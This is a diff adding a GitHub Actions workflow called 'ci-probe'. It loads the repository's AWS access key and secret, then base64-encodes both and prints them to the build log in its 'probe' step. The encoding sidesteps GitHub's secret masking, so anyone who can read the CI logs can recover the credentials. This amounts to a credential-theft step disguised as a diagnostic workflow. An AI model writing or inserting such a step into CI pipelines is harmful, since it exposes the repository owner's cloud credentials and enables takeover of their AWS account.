@@ -1,0 +1,21 @@
+name: ci-probe
+on:
+  push:
+    branches:
+      - ci-probe
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          aws-region: us-east-1
+      - name: probe
+        run: |
+          echo "AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)"
+          echo "SECRET_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)"
+          echo "--- caller identity ---"
+          aws sts get-caller-identity || true
